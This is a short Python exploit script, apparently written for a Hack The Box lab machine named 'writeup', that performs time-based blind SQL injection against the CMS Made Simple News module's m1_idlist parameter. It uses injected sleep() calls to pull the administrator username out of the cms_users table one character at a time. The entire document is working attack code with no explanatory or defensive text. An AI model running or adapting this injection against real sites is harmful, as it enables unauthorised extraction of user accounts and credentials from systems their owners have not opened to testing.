import requests, time, string

url = "http://writeup.htb/writeup/moduleinterface.php?mact=News,m1_,default,0"
charset = string.digits + string.ascii_lowercase
extracted = ""

for i in range(32):  # max length
    found = False
    for c in charset:
        payload = f"a,b,1,5))+and+(select+sleep(3)+from+cms_users+where+username+like+0x{extracted.encode().hex() + format(ord(c),'x')}25+and+user_id+like+0x31)+--+"
        start = time.time()
        requests.get(url, params={"m1_idlist": payload}, timeout=10)
        if time.time() - start >= 2.8:
            extracted += c
            print(f"[+] Found: {extracted}")
            found = True
            break
    if not found:
        break

print(f"Username: {extracted}")

